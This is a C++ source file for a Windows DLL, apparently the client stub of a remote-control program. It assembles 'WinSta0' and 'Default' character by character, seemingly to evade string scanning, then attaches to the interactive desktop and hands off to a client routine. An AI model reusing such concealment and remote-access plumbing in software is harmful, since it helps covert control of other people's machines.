// PcMain.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "MyClientMain.h"

void WINAPI Vip20101125(PSDLLINFO m_Info, DWORD* pRet)
{
	//WinSta0
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'W';
	m_TempStr[1] = 'i';
	m_TempStr[2] = 'n';
	m_TempStr[3] = 'S';
	m_TempStr[4] = 't';
	m_TempStr[5] = 'a';
	m_TempStr[6] = '0';
	m_TempStr[7] = 0x00;

	//设置当前工作台
	HWINSTA hNorWinStat = OpenWindowStation(m_TempStr, TRUE, MAXIMUM_ALLOWED);
   	if(hNorWinStat != NULL)
	{
		SetProcessWindowStation(hNorWinStat);
	}
	
	//Default
	m_TempStr[0] = 'D';
	m_TempStr[1] = 'e';
	m_TempStr[2] = 'f';
	m_TempStr[3] = 'a';
	m_TempStr[4] = 'u';
	m_TempStr[5] = 'l';
	m_TempStr[6] = 't';
	m_TempStr[7] = 0x00;

	//设置当前桌面
	HDESK hNorDesktop = OpenDesktop(m_TempStr, DF_ALLOWOTHERACCOUNTHOOK, TRUE, MAXIMUM_ALLOWED);
	if(hNorDesktop != NULL)
	{
		SetThreadDesktop(hNorDesktop);
	}
	
	CMyClientMain m_ClientMain;
	m_ClientMain.DoWork(m_Info, pRet);

	CloseDesktop(hNorDesktop);
	CloseWindowStation(hNorWinStat);
}

HINSTANCE ghInstance = NULL;
BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	ghInstance = hinstDLL;
	if(DLL_PROCESS_ATTACH == fdwReason)
	{
		WSADATA	data = {0};
		WSAStartup(MAKEWORD(2, 2), &data);
	}
    return TRUE;
}
